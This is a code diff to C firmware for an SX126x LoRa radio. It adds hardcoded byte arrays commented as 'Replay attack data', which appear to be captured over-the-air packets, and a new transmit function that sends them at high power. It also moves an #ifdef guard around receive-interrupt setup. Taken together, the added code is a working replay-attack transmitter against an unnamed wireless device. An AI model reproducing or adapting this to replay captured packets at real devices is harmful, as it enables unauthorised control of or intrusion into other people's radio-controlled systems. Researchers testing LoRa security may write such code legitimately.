@@ -27,6 +27,21 @@ extern sx126x_handle_t radio_drv;
 
 uchar  lora_mem[256];
 
+// Replay attack data
+#if 1
+unsigned char tx_data[37] = {
+	0x15, 0x00, 0x11, 0x4F, 0xB5, 0x74, 0x53, 0x49, 0x18, 0x80, 0x0F, 0xF1, 0xB5, 0x1E, 0x75, 0x3C,
+	0x57, 0x3B, 0xC0, 0xBD, 0x80, 0x30, 0x63, 0xAD, 0x08, 0x74, 0xAD, 0xBF, 0xBE, 0x8A, 0x73, 0x3B,
+	0x83, 0xC5, 0x2C, 0xF3, 0x06
+};
+#else
+unsigned char tx_data[38] = {
+	0x15, 0x01, 0x25, 0x90, 0xCC, 0xB6, 0x18, 0x09, 0x3B, 0x66, 0xC5, 0xC4, 0x74, 0x95, 0xF5, 0x99,
+	0x7F, 0x41, 0x4E, 0xFE, 0xE5, 0xE9, 0xAD, 0xAA, 0xCF, 0xB3, 0x56, 0xFA, 0x9C, 0x05, 0x52, 0x8A,
+	0xD3, 0x5A, 0x6A, 0x91, 0xB9, 0xB8
+};
+#endif
+
 static uchar lora_radio_find_chip(void)
 {
 	char version[100];
@@ -181,6 +196,7 @@ uchar lora_radio_init(void)
 	if(sx126x_set_rf_frequency(&radio_drv, LORA_FR) != 0)
 		return 10;
 
+	#ifdef CONT_RX
 	// Start IRQ
 	if(sx126x_set_dio_irq_params(&radio_drv, RADIOLIB_SX126X_IRQ_ALL, RADIOLIB_SX126X_IRQ_RX_DONE, 0, 0) != 0)
 	{
@@ -189,7 +205,6 @@ uchar lora_radio_init(void)
 	}
 
 	// Start RX
-	#ifdef CONT_RX
 	if(sx126x_set_op_mode_rx_cont(&radio_drv) != 0)
 		return 12;
 	#endif
@@ -426,6 +441,45 @@ void lora_radio_rx_check(void)
 
 restart_rx:
 	rx_state = 0;	// restart
+}
+
+void lora_radio_schedule_tx(void)
+{
+	ushort 	a = 0;
+	uchar  	b = 0, c = 0;
+
+	printf("tx ...\r\n");
+
+	sx126x_set_pa_config(&radio_drv, 0x04, 0x07, false);
+	sx126x_set_tx_params(&radio_drv, 22, true, 200);
+	sx126x_set_packet_params_lora(&radio_drv, LORA_PL, false, sizeof(tx_data), true, false);
+	sx126x_write_buffer(&radio_drv, 0x00, tx_data, sizeof(tx_data));
+	sx126x_set_dio_irq_params(&radio_drv, RADIOLIB_SX126X_IRQ_ALL, RADIOLIB_SX126X_IRQ_TX_DONE|RADIOLIB_SX126X_IRQ_TIMEOUT, 0, 0);
+	//sx126x_set_op_mode_tx(&radio_drv);
+	sx126x_set_op_mode_tx_t(&radio_drv, TX_TIMEOUT_F);
+
+	// Wait complete
+	if(sx126x_irq_wait(&radio_drv, 5000) != 0)
+	{
+		printf("irq timeout\r\n");
+		return;
+	}
+
+	// Get irq status
+	if(sx126x_get_irq_status(&radio_drv, &a, &b, &c) == 0)
+	{
+		printf("irq stat: 0x%02x(%02x,%02x)\r\n", a, b, c);
+
+		sx126x_clear_irq_status(&radio_drv, a);
+
+		if((a & RADIOLIB_SX126X_IRQ_TIMEOUT) == RADIOLIB_SX126X_IRQ_TIMEOUT)
+			printf("--> timeout \r\n");
+
+		if((a & RADIOLIB_SX126X_IRQ_TX_DONE) == RADIOLIB_SX126X_IRQ_TX_DONE)
+			printf("--> tx done \r\n");
+	}
+
+	printf("tx finished\r\n");
 }
 
 #endif
